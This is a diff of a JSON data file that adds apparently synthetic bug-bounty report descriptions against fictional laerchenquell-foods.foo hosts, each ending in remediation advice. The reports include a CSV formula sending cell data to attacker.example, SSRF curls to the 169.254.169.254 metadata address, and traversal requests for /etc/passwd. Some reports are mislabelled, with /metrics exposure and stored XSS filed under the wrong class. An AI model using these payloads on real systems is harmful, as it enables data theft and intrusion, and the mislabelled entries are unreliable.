+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10402,7 +10480,8 @@
           "offset": "1d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10513,7 +10592,8 @@
           "offset": "23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://erp.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10628,7 +10708,8 @@
           "offset": "3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10782,7 +10863,8 @@
           "offset": "4d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://erp.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10961,7 +11043,8 @@
           "offset": "6d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11051,7 +11134,8 @@
           "offset": "3d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://erp.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11153,7 +11237,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11309,7 +11394,8 @@
           "offset": "6d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11449,7 +11535,8 @@
           "offset": "2d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11585,7 +11672,8 @@
           "offset": "6d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11737,7 +11825,8 @@
           "offset": "6d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11824,7 +11913,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11931,7 +12021,8 @@
           "offset": "3d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12059,7 +12150,8 @@
           "offset": "1d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12210,7 +12302,8 @@
           "offset": "2d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12353,7 +12446,8 @@
           "offset": "6d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12481,7 +12575,8 @@
           "offset": "9d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12605,7 +12700,8 @@
           "offset": "2d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12742,7 +12838,8 @@
           "offset": "21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12841,7 +12938,8 @@
           "offset": "2d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12942,7 +13040,8 @@
           "offset": "3d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13038,7 +13137,8 @@
           "offset": "21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13182,7 +13282,8 @@
           "offset": "3d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13326,7 +13427,8 @@
           "offset": "6d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13461,7 +13563,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13569,7 +13672,8 @@
           "offset": "3d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13709,7 +13813,8 @@
           "offset": "5d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13792,7 +13897,8 @@
           "offset": "23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13939,7 +14045,8 @@
           "offset": "4d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14130,7 +14237,8 @@
           "offset": "5d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
